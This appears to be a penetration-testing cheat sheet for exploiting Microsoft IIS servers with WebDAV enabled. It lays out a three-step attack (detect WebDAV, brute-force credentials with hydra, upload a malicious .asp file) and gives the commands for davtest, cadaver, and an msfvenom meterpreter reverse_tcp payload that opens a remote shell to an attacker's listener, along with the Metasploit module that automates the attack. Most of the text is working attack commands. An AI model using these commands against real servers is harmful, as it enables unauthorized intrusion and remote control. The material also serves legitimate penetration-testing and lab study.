IIS is the microsoft web server software for windows systems. Works with ASP.NET and PHP, with file extensions like .asp, .aspx, .config, .php.

WebDAV (Web-based Distributed Authoring and Versioning) enables a web server to work as a file server.

# Exploitation
- Identify if WebDAV is configured in IIS server.
- Perform brute-force attack to obtain credentials.
- Upload a malicious .asp file.

# Tools

## Davtest
Used to scan, authenticate and exploit a WebDAV server.
```
davtest -url URL -auth USER:PASS
```

## Cadaver
Is a client used to interact with WebDAV files
```
cadaver WEBDAV_URL
> put FILE
```

## Hydra
```
hydra -L USER_LIST -P WORDLIST IP_ADDRESS http-get /WEBDAV-DIR/
```

## Metasploit 
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp
[!] The file extension depends of the results of davtest
For listener use multi/handler and the same payload of msfvenom

This can be automated with exploit/windows/iis/iis_webdav_upload_asp
